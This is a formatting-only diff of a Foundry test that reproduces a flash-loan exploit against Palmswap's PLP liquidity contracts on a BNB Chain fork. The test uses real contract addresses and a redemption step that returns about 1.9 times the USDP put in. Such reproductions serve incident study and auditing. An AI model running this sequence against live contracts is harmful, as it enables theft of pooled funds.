@@ -20,17 +20,9 @@ interface IVault {
 }
 
 interface ILiquidityEvent {
-    function purchasePlp(
-        uint256 _amountIn,
-        uint256 _minUsdp,
-        uint256 _minPlp
-    ) external returns (uint256 amountOut);
+    function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp) external returns (uint256 amountOut);
 
-    function unstakeAndRedeemPlp(
-        uint256 _plpAmount,
-        uint256 _minOut,
-        address _receiver
-    ) external returns (uint256);
+    function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver) external returns (uint256);
 }
 
 contract PalmswapTest is Test {
@@ -38,18 +30,15 @@ contract PalmswapTest is Test {
     IERC20 PLP = IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);
     IERC20 USDP = IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);
     IVault Vault = IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);
-    ILiquidityEvent LiquidityEvent =
-        ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);
-    IAaveFlashloan RadiantLP =
-        IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
-    address private constant plpManager =
-        0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;
+    ILiquidityEvent LiquidityEvent = ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);
+    IAaveFlashloan RadiantLP = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
+    address private constant plpManager = 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;
     address private constant fPLP = 0x305496cecCe61491794a4c36D322b42Bb81da9c4;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 30248637);
+        cheats.createSelectFork("bsc", 30_248_637);
         cheats.label(address(BUSDT), "BUSDT");
         cheats.label(address(PLP), "PLP");
         cheats.label(address(USDP), "USDP");
@@ -67,18 +56,14 @@ contract PalmswapTest is Test {
         PLP.approve(fPLP, type(uint256).max);
 
         emit log_named_decimal_uint(
-            "Attacker balance of BUSDT before exploit",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
-        );
+            "Attacker balance of BUSDT before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
+            );
 
         takeFlashLoanOnRadiant();
 
         emit log_named_decimal_uint(
-            "Attacker balance of BUSDT after exploit",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
-        );
+            "Attacker balance of BUSDT after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
+            );
     }
 
     function executeOperation(
@@ -95,13 +80,9 @@ contract PalmswapTest is Test {
         Vault.buyUSDP(address(this));
         // Remove liquidity. Exchange rate between USDP and PLP is 1:1.9.
         // Attacker is able to exchange for 1.9 times more USDP
-        uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(
-            amountOut - 13_294 * 1e15,
-            0,
-            address(this)
-        );
+        uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));
 
-        USDP.transfer(address(Vault), amountUSDP - 3_154 * 1e18);
+        USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);
         Vault.sellUSDP(address(this));
 
         return true;
@@ -114,14 +95,6 @@ contract PalmswapTest is Test {
         amounts[0] = 3_000_000 * 1e18;
         uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
-        RadiantLP.flashLoan(
-            address(this),
-            assets,
-            amounts,
-            modes,
-            address(this),
-            bytes(""),
-            0
-        );
+        RadiantLP.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
     }
 }
